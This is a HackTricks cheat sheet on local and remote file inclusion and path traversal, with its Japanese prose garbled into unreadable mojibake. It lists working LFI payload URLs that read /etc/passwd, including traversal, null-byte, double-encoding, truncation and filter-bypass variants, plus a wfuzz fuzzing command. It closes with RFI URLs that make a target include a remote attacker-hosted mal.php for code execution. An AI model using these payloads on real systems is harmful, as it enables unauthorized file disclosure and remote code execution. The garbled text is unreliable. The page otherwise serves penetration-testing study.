# ãƒ•ã‚¡ã‚¤ãƒ«ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ã‚¸ãƒ§ãƒ³/ãƒ‘ã‚¹éæ­´

<details>

<summary><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>ã§AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§å­¦ã¶</strong></a><strong>ï¼</strong></summary>

HackTricks ã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

* **HackTricks ã§ä¼æ¥­ã‚’å®£ä¼ã—ãŸã„**ã¾ãŸã¯ **HackTricks ã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASSï¼†HackTricksã‚¹ãƒ¯ãƒƒã‚°**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¦‹ã¤ã‘ã‚‹
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã—ã€**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)ã§ **ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„ã€‚
* **ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ãŸã‚ã«PRã‚’æå‡ºã—ã¦** [**HackTricks**](https://github.com/carlospolop/hacktricks) ã¨ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«å‚åŠ ã—ã¦ãã ã•ã„ã€‚

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

çµŒé¨“è±Šå¯Œãªãƒãƒƒã‚«ãƒ¼ã‚„ãƒã‚°ãƒã‚¦ãƒ³ãƒ†ã‚£ãƒãƒ³ã‚¿ãƒ¼ã¨ã‚³ãƒŸãƒ¥ãƒ‹ã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’å–ã‚‹ãŸã‚ã«[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) ã‚µãƒ¼ãƒãƒ¼ã«å‚åŠ ã—ã¾ã—ã‚‡ã†ï¼

**ãƒãƒƒã‚­ãƒ³ã‚°ã®æ´å¯Ÿ**\
ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚¹ãƒªãƒ«ã¨ãƒãƒ£ãƒ¬ãƒ³ã‚¸ã«æ·±ãå…¥ã‚Šè¾¼ã‚€ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã«å‚åŠ ã™ã‚‹

**ãƒªã‚¢ãƒ«ã‚¿ã‚¤ãƒ ãƒãƒƒã‚¯ãƒ‹ãƒ¥ãƒ¼ã‚¹**\
ãƒªã‚¢ãƒ«ã‚¿ã‚¤ãƒ ã®ãƒ‹ãƒ¥ãƒ¼ã‚¹ã¨æ´å¯Ÿã‚’é€šã˜ã¦ã€ãƒãƒƒã‚­ãƒ³ã‚°ã®ä¸–ç•Œã®é€Ÿã„ãƒšãƒ¼ã‚¹ã«ã¤ã„ã¦ã„ã

**æœ€æ–°ã®ã‚¢ãƒŠã‚¦ãƒ³ã‚¹ãƒ¡ãƒ³ãƒˆ**\
æœ€æ–°ã®ãƒã‚°ãƒã‚¦ãƒ³ãƒ†ã‚£ã®é–‹å§‹ã‚„é‡è¦ãªãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã®ã‚¢ãƒƒãƒ—ãƒ‡ãƒ¼ãƒˆã«ã¤ã„ã¦ã®æƒ…å ±ã‚’å¾—ã‚‹

**[**Discord**](https://discord.com/invite/N3FrSbmwdy) ã«å‚åŠ ã—ã¦ã€ä»Šæ—¥ã‹ã‚‰ãƒˆãƒƒãƒ—ãƒãƒƒã‚«ãƒ¼ã¨å”åŠ›ã‚’å§‹ã‚ã¾ã—ã‚‡ã†ï¼

## ãƒ•ã‚¡ã‚¤ãƒ«ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ã‚¸ãƒ§ãƒ³

**ãƒªãƒ¢ãƒ¼ãƒˆãƒ•ã‚¡ã‚¤ãƒ«ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ã‚¸ãƒ§ãƒ³ï¼ˆRFIï¼‰:** ãƒ•ã‚¡ã‚¤ãƒ«ãŒãƒªãƒ¢ãƒ¼ãƒˆã‚µãƒ¼ãƒãƒ¼ã‹ã‚‰èª­ã¿è¾¼ã¾ã‚Œã¾ã™ï¼ˆæœ€é©: ã‚³ãƒ¼ãƒ‰ã‚’æ›¸ã„ã¦ã‚µãƒ¼ãƒãƒ¼ãŒå®Ÿè¡Œã—ã¾ã™ï¼‰ã€‚PHPã§ã¯ã€ã“ã‚Œã¯ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ **ç„¡åŠ¹** ã§ã™ï¼ˆ**allow\_url\_include**ï¼‰ã€‚\
**ãƒ­ãƒ¼ã‚«ãƒ«ãƒ•ã‚¡ã‚¤ãƒ«ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ã‚¸ãƒ§ãƒ³ï¼ˆLFIï¼‰:** ã‚µãƒ¼ãƒãƒ¼ãŒãƒ­ãƒ¼ã‚«ãƒ«ãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã¿è¾¼ã¿ã¾ã™ã€‚

ã“ã®è„†å¼±æ€§ã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒã‚µãƒ¼ãƒãƒ¼ã«ã‚ˆã£ã¦èª­ã¿è¾¼ã¾ã‚Œã‚‹ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚ã‚‹æ–¹æ³•ã§åˆ¶å¾¡ã§ãã‚‹å ´åˆã«ç™ºç”Ÿã—ã¾ã™ã€‚

è„†å¼±ãª **PHPé–¢æ•°**: requireã€require\_onceã€includeã€include\_once

ã“ã®è„†å¼±æ€§ã‚’æ‚ªç”¨ã™ã‚‹ãŸã‚ã®èˆˆå‘³æ·±ã„ãƒ„ãƒ¼ãƒ«: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interesting - LFI2RCE files
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**è¤‡æ•°ã® \*nix LFI ãƒªã‚¹ãƒˆã‚’çµ„ã¿åˆã‚ã›ã€ã•ã‚‰ã«ãƒ‘ã‚¹ã‚’è¿½åŠ ã—ã¦ä½œæˆã—ãŸã‚‚ã®:**

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt" %}

`/` ã‚’ `\` ã«å¤‰æ›´ã—ã¦ã¿ã¦ãã ã•ã„\
`../../../../../` ã‚’è¿½åŠ ã—ã¦ã¿ã¦ãã ã•ã„

è„†å¼±æ€§ã®å­˜åœ¨ã‚’ç¢ºèªã™ã‚‹ãŸã‚ã«ãƒ•ã‚¡ã‚¤ãƒ« /etc/password ã‚’è¦‹ã¤ã‘ã‚‹ãŸã‚ã«è¤‡æ•°ã®æŠ€è¡“ã‚’ä½¿ç”¨ã™ã‚‹ãƒªã‚¹ãƒˆã¯[ã“ã¡ã‚‰](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt) ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

### **Windows**

ç•°ãªã‚‹ãƒ¯ãƒ¼ãƒ‰ãƒªã‚¹ãƒˆã®çµ±åˆ:

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt" %}

`/` ã‚’ `\` ã«å¤‰æ›´ã—ã¦ã¿ã¦ãã ã•ã„\
`C:/` ã‚’å‰Šé™¤ã—ã¦ `../../../../../` ã‚’è¿½åŠ ã—ã¦ã¿ã¦ãã ã•ã„

è„†å¼±æ€§ã®å­˜åœ¨ã‚’ç¢ºèªã™ã‚‹ãŸã‚ã«ãƒ•ã‚¡ã‚¤ãƒ« /boot.ini ã‚’è¦‹ã¤ã‘ã‚‹ãŸã‚ã«è¤‡æ•°ã®æŠ€è¡“ã‚’ä½¿ç”¨ã™ã‚‹ãƒªã‚¹ãƒˆã¯[ã“ã¡ã‚‰](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt) ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

### **OS X**

Linux ã® LFI ãƒªã‚¹ãƒˆã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ã€‚

## åŸºæœ¬çš„ãª LFI ã¨ãƒã‚¤ãƒ‘ã‚¹

ã™ã¹ã¦ã®ä¾‹ã¯ãƒ­ãƒ¼ã‚«ãƒ«ãƒ•ã‚¡ã‚¤ãƒ«ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ã‚¸ãƒ§ãƒ³ç”¨ã§ã™ãŒã€ãƒªãƒ¢ãƒ¼ãƒˆãƒ•ã‚¡ã‚¤ãƒ«ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚‚é©ç”¨ã§ãã¾ã™ï¼ˆpage=[http://myserver.com/phpshellcode.txt\\](http://myserver.com/phpshellcode.txt\)/ï¼‰ã€‚
```
http://example.com/index.php?page=../../../etc/passwd
```
### éå†å¸°çš„ã«å–ã‚Šé™¤ã‹ã‚ŒãŸãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«ã‚·ãƒ¼ã‚±ãƒ³ã‚¹
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **ãƒŒãƒ«ãƒã‚¤ãƒˆ (%00)**

æä¾›ã•ã‚ŒãŸæ–‡å­—åˆ—ã®æœ«å°¾ã«è¿½åŠ ã®æ–‡å­—ã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹ï¼ˆãƒã‚¤ãƒ‘ã‚¹æ–¹æ³•: $\_GET\['param']."php"ï¼‰
```
http://example.com/index.php?page=../../../etc/passwd%00
```
ã“ã‚Œã¯**PHP 5.4ä»¥é™ã§è§£æ±ºæ¸ˆã¿**

### **ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°**

ãƒ€ãƒ–ãƒ«URLã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ï¼ˆãã®ä»–ã‚‚å«ã‚€ï¼‰ãªã©ã€æ¨™æº–ã§ãªã„ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### æ—¢å­˜ã®ãƒ•ã‚©ãƒ«ãƒ€ã‹ã‚‰

ã‚‚ã—ã‹ã—ãŸã‚‰ã€ãƒãƒƒã‚¯ã‚¨ãƒ³ãƒ‰ãŒãƒ•ã‚©ãƒ«ãƒ€ã®ãƒ‘ã‚¹ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ã„ã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ï¼š
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### ã‚µãƒ¼ãƒãƒ¼ä¸Šã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã®æ¢ç´¢

ã‚µãƒ¼ãƒãƒ¼ã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ã¯ã€ç‰¹å®šã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã‚’ç”¨ã„ã¦ã€ãƒ•ã‚¡ã‚¤ãƒ«ã ã‘ã§ãªããƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã‚’å†å¸°çš„ã«æ¢ç´¢ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã®ãƒ—ãƒ­ã‚»ã‚¹ã«ã¯ã€ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã®æ·±ã•ã‚’ç‰¹å®šã—ã€ç‰¹å®šã®ãƒ•ã‚©ãƒ«ãƒ€ã®å­˜åœ¨ã‚’èª¿æŸ»ã™ã‚‹ã“ã¨ãŒå«ã¾ã‚Œã¾ã™ã€‚ä»¥ä¸‹ã«ã€ã“ã‚Œã‚’é”æˆã™ã‚‹ãŸã‚ã®è©³ç´°ãªæ–¹æ³•ãŒç¤ºã•ã‚Œã¦ã„ã¾ã™ï¼š

1. **ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã®æ·±ã•ã‚’ç‰¹å®šã™ã‚‹ï¼š**
ç¾åœ¨ã®ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã®æ·±ã•ã‚’ç¢ºèªã™ã‚‹ã«ã¯ã€`/etc/passwd`ãƒ•ã‚¡ã‚¤ãƒ«ã‚’æ­£å¸¸ã«å–å¾—ã™ã‚‹ã“ã¨ã«ã‚ˆã£ã¦ï¼ˆã‚µãƒ¼ãƒãƒ¼ãŒLinuxãƒ™ãƒ¼ã‚¹ã®å ´åˆã«é©ç”¨ã•ã‚Œã‚‹ï¼‰ã€ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã®æ·±ã•ã‚’ç¢ºå®šã—ã¾ã™ã€‚æ·±ã•ãŒ3ã§ã‚ã‚‹ã“ã¨ã‚’ç¤ºã™ã€ä»¥ä¸‹ã®ã‚ˆã†ãªæ§‹é€ ã®ä¾‹ã®URLãŒã‚ã‚Šã¾ã™ï¼š
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **ãƒ•ã‚©ãƒ«ãƒ€ã®æ¢ç´¢:**
URLã«ç–‘ã‚ã—ã„ãƒ•ã‚©ãƒ«ãƒ€ã®åå‰ï¼ˆä¾‹ï¼š`private`ï¼‰ã‚’è¿½åŠ ã—ã€æ¬¡ã«`/etc/passwd`ã«æˆ»ã‚Šã¾ã™ã€‚è¿½åŠ ã®ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªãƒ¬ãƒ™ãƒ«ã¯ã€æ·±ã•ã‚’1ã¤å¢—ã‚„ã™å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼š
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **çµæœã®è§£é‡ˆ:**
ã‚µãƒ¼ãƒãƒ¼ã®å¿œç­”ã«ã‚ˆã‚Šã€ãƒ•ã‚©ãƒ«ãƒ€ãŒå­˜åœ¨ã™ã‚‹ã‹ã©ã†ã‹ãŒç¤ºã•ã‚Œã¾ã™:
- **ã‚¨ãƒ©ãƒ¼ / å‡ºåŠ›ãªã—:** `private` ãƒ•ã‚©ãƒ«ãƒ€ã¯ãŠãã‚‰ãæŒ‡å®šã•ã‚ŒãŸå ´æ‰€ã«å­˜åœ¨ã—ãªã„å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚
- **`/etc/passwd` ã®å†…å®¹:** `private` ãƒ•ã‚©ãƒ«ãƒ€ã®å­˜åœ¨ãŒç¢ºèªã•ã‚Œã¾ã—ãŸã€‚

4. **å†å¸°çš„ãªæ¢ç´¢:**
ç™ºè¦‹ã—ãŸãƒ•ã‚©ãƒ«ãƒ€ã¯ã€åŒã˜æŠ€è¡“ã¾ãŸã¯å¾“æ¥ã®ãƒ­ãƒ¼ã‚«ãƒ«ãƒ•ã‚¡ã‚¤ãƒ«ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ã‚¸ãƒ§ãƒ³ï¼ˆLFIï¼‰æ–¹æ³•ã‚’ä½¿ç”¨ã—ã¦ã€ã•ã‚‰ã«ã‚µãƒ–ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã‚„ãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª¿æŸ»ã§ãã¾ã™ã€‚

ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ å†…ã®ç•°ãªã‚‹å ´æ‰€ã®ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã‚’æ¢ç´¢ã™ã‚‹ã«ã¯ã€ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’é©åˆ‡ã«èª¿æ•´ã—ã¾ã™ã€‚ãŸã¨ãˆã°ã€ç¾åœ¨ã®ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªãŒæ·±ã•3ã§ã‚ã‚‹ã¨ä»®å®šã—ã¦ã€`/var/www/` ã« `private` ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªãŒå«ã¾ã‚Œã¦ã„ã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã™ã‚‹ã«ã¯ã€æ¬¡ã®ã‚ˆã†ã«ã—ã¾ã™:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **ãƒ‘ã‚¹åˆ‡ã‚Šè©°ã‚æŠ€è¡“**

ãƒ‘ã‚¹åˆ‡ã‚Šè©°ã‚ã¯ã€Webã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³å†…ã®ãƒ•ã‚¡ã‚¤ãƒ«ãƒ‘ã‚¹ã‚’æ“ä½œã™ã‚‹ãŸã‚ã®æ‰‹æ³•ã§ã™ã€‚ã“ã‚Œã¯ã€ç‰¹å®šã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å¯¾ç­–ãŒãƒ•ã‚¡ã‚¤ãƒ«ãƒ‘ã‚¹ã®æœ«å°¾ã«è¿½åŠ ã®æ–‡å­—ã‚’ä»˜åŠ ã™ã‚‹ã“ã¨ã§ã€åˆ¶é™ã•ã‚ŒãŸãƒ•ã‚¡ã‚¤ãƒ«ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ãŸã‚ã«ã—ã°ã—ã°ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚ç›®æ¨™ã¯ã€ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å¯¾ç­–ã«ã‚ˆã£ã¦å¤‰æ›´ã•ã‚ŒãŸãƒ•ã‚¡ã‚¤ãƒ«ãƒ‘ã‚¹ãŒã€ä¾ç„¶ã¨ã—ã¦ç›®çš„ã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚’æŒ‡ã™ã‚ˆã†ã«ã™ã‚‹ã“ã¨ã§ã™ã€‚

PHPã§ã¯ã€ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ã®æ€§è³ªã«ã‚ˆã‚Šã€ãƒ•ã‚¡ã‚¤ãƒ«ãƒ‘ã‚¹ã®ã•ã¾ã–ã¾ãªè¡¨ç¾ãŒåŒç­‰ã¨è¦‹ãªã•ã‚Œã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚ãŸã¨ãˆã°ï¼š

- `/etc/passwd`ã€`/etc//passwd`ã€`/etc/./passwd`ã€`/etc/passwd/` ã¯ã™ã¹ã¦åŒã˜ãƒ‘ã‚¹ã¨ã—ã¦æ‰±ã‚ã‚Œã¾ã™ã€‚
- æœ€å¾Œã®6æ–‡å­—ãŒ `passwd` ã®å ´åˆã€`/` ã‚’è¿½åŠ ã—ã¦ `passwd/` ã«ã™ã‚‹ã¨ã€å¯¾è±¡ã®ãƒ•ã‚¡ã‚¤ãƒ«ãŒå¤‰ã‚ã‚‰ãªã„ã€‚
- åŒæ§˜ã«ã€ãƒ•ã‚¡ã‚¤ãƒ«ãƒ‘ã‚¹ã« `.php` ãŒè¿½åŠ ã•ã‚Œã¦ã„ã‚‹å ´åˆï¼ˆä¾‹ï¼š `shellcode.php`ï¼‰ã€æœ«å°¾ã« `/.` ã‚’è¿½åŠ ã—ã¦ã‚‚ã‚¢ã‚¯ã‚»ã‚¹ã•ã‚Œã‚‹ãƒ•ã‚¡ã‚¤ãƒ«ã¯å¤‰ã‚ã‚Šã¾ã›ã‚“ã€‚

æä¾›ã•ã‚ŒãŸä¾‹ã¯ã€ãƒ‘ã‚¹åˆ‡ã‚Šè©°ã‚ã‚’åˆ©ç”¨ã—ã¦ `/etc/passwd` ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹æ–¹æ³•ã‚’ç¤ºã—ã¦ã„ã¾ã™ã€‚ã“ã‚Œã¯ã€ãã®ä¸­ã«ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚¢ã‚«ã‚¦ãƒ³ãƒˆæƒ…å ±ãªã©ã®æ©Ÿå¯†æƒ…å ±ãŒå«ã¾ã‚Œã¦ã„ã‚‹ãŸã‚ã€ä¸€èˆ¬çš„ãªã‚¿ãƒ¼ã‚²ãƒƒãƒˆã§ã™ã€‚
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
ã“ã‚Œã‚‰ã®ã‚·ãƒŠãƒªã‚ªã§ã¯ã€å¿…è¦ãªãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«ã®æ•°ã¯ç´„2027å›ã«ãªã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ãŒã€ã“ã®æ•°ã¯ã‚µãƒ¼ãƒãƒ¼ã®æ§‹æˆã«ã‚ˆã£ã¦ç•°ãªã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

- **ãƒ‰ãƒƒãƒˆã‚»ã‚°ãƒ¡ãƒ³ãƒˆã¨è¿½åŠ æ–‡å­—ã®ä½¿ç”¨**:
ãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«ã‚·ãƒ¼ã‚±ãƒ³ã‚¹ï¼ˆ`../`ï¼‰ã¯ã€è¿½åŠ ã®ãƒ‰ãƒƒãƒˆã‚»ã‚°ãƒ¡ãƒ³ãƒˆã¨æ–‡å­—ã¨çµ„ã¿åˆã‚ã›ã¦ä½¿ç”¨ã™ã‚‹ã“ã¨ã§ã€ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ã‚’ãƒŠãƒ“ã‚²ãƒ¼ãƒˆã—ã€ã‚µãƒ¼ãƒãƒ¼ã«ã‚ˆã£ã¦è¿½åŠ ã•ã‚ŒãŸæ–‡å­—åˆ—ã‚’ç„¡è¦–ã™ã‚‹åŠ¹æœçš„ãªæ–¹æ³•ã¨ãªã‚Šã¾ã™ã€‚

- **å¿…è¦ãªãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«ã®æ•°ã‚’æ±ºå®šã™ã‚‹**:
è©¦è¡ŒéŒ¯èª¤ã‚’é€šã˜ã¦ã€`../`ã‚·ãƒ¼ã‚±ãƒ³ã‚¹ã®æ­£ç¢ºãªæ•°ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã€ãƒ«ãƒ¼ãƒˆãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã«ç§»å‹•ã—ã€ãã®å¾Œ`/etc/passwd`ã«ç§»å‹•ã™ã‚‹ãŸã‚ã«å¿…è¦ãªæ•°ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€è¿½åŠ ã•ã‚ŒãŸæ–‡å­—åˆ—ï¼ˆä¾‹: `.php`ï¼‰ãŒä¸­ç«‹åŒ–ã•ã‚Œã€ã—ã‹ã—æœ›ã¾ã—ã„ãƒ‘ã‚¹ï¼ˆ`/etc/passwd`ï¼‰ãŒç¶­æŒã•ã‚Œã¾ã™ã€‚

- **å½ã®ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã‹ã‚‰å§‹ã‚ã‚‹**:
å­˜åœ¨ã—ãªã„ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªï¼ˆä¾‹: `a/`ï¼‰ã§ãƒ‘ã‚¹ã‚’é–‹å§‹ã™ã‚‹ã®ã¯ä¸€èˆ¬çš„ãªæ–¹æ³•ã§ã™ã€‚ã“ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã¯ã€äºˆé˜²æªç½®ã¨ã—ã¦ä½¿ç”¨ã•ã‚Œã‚‹ã‹ã€ã‚µãƒ¼ãƒãƒ¼ã®ãƒ‘ã‚¹è§£æãƒ­ã‚¸ãƒƒã‚¯ã®è¦ä»¶ã‚’æº€ãŸã™ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚

ãƒ‘ã‚¹åˆ‡ã‚Šè©°ã‚æŠ€è¡“ã‚’ä½¿ç”¨ã™ã‚‹éš›ã«ã¯ã€ã‚µãƒ¼ãƒãƒ¼ã®ãƒ‘ã‚¹è§£æå‹•ä½œã¨ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ æ§‹é€ ã‚’ç†è§£ã™ã‚‹ã“ã¨ãŒé‡è¦ã§ã™ã€‚å„ã‚·ãƒŠãƒªã‚ªã«ã¯ç•°ãªã‚‹ã‚¢ãƒ—ãƒ­ãƒ¼ãƒãŒå¿…è¦ã¨ãªã‚‹å ´åˆãŒã‚ã‚Šã€æœ€ã‚‚åŠ¹æœçš„ãªæ–¹æ³•ã‚’è¦‹ã¤ã‘ã‚‹ãŸã‚ã«ã¯ãƒ†ã‚¹ãƒˆãŒã—ã°ã—ã°å¿…è¦ã§ã™ã€‚

**ã“ã®è„†å¼±æ€§ã¯PHP 5.3ã§ä¿®æ­£ã•ã‚Œã¾ã—ãŸã€‚**

### **ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼å›é¿ãƒˆãƒªãƒƒã‚¯**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## ãƒªãƒ¢ãƒ¼ãƒˆãƒ•ã‚¡ã‚¤ãƒ«ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ã‚¸ãƒ§ãƒ³

PHPã§ã¯ã€ã“ã‚Œã¯ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ç„¡åŠ¹ã«ãªã£ã¦ã„ã¾ã™ã€‚ãªãœãªã‚‰ã€**`allow_url_include`** ãŒ **Off** ã«ãªã£ã¦ã„ã‚‹ã‹ã‚‰ã§ã™ã€‚ã“ã‚Œã‚’å‹•ä½œã•ã›ã‚‹ã«ã¯ã€**On** ã«ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã€ãã®å ´åˆã€ã‚µãƒ¼ãƒãƒ¼ã‹ã‚‰PHPãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ãƒ‰ã—ã¦RCEã‚’å–å¾—ã§ãã¾ã™ã€‚
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
